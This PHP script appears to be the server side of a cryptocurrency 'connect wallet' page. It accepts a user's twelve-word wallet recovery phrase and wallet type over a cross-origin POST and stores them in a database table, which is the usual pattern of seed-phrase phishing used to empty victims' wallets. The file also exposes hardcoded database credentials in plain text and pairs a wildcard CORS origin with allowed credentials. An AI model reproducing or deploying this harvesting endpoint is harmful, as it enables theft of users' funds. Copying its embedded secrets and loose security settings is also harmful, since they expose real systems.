<?php
// ===== CORS HEADERS =====
header("Access-Control-Allow-Origin: *"); // React app origin
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Credentials: true");
header('Content-Type: application/json; charset=utf-8');// Ensure JSON response



// ===== ERROR REPORTING =====
// Disable warnings/notices breaking JSON
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

// ===== DATABASE CONNECTION =====
$host = "localhost";       // Usually localhost
$user = "ktkdvcdj_root";            // Default user
$password = "victor47009A"; // Your Laragon password
$database = "ktkdvcdj_bluevult"; 


$conn = mysqli_connect($host, $user, $password, $database);

if (!$conn) {
    echo json_encode(['success' => false, 'message' => 'Database connection failed']);
    exit();
}
else {
   // echo 'connect Success';
}

mysqli_set_charset($conn, "utf8");
// Get POST data
$data = json_decode(file_get_contents('php://input'), true);
$user_id = $data['user_id'];
$phrase = $data['phrase']; // e.g., "word1 word2 ... word12"
$wallet_type = $data['wallet_name'];
//$time = time();

// Prepare and insert
$stmt = $conn->prepare("INSERT INTO connected_wallets (user_id,wallet_type , word_inputs) VALUES (?,?, ?)");
$stmt->bind_param("iss", $user_id, $wallet_type, $phrase);

if ($stmt->execute()) {
    echo json_encode(['success' => true, 'message' => 'Phrase saved']);
} else {
    echo json_encode(['success' => false, 'message' => $stmt->error]);
}

$stmt->close();
$conn->close();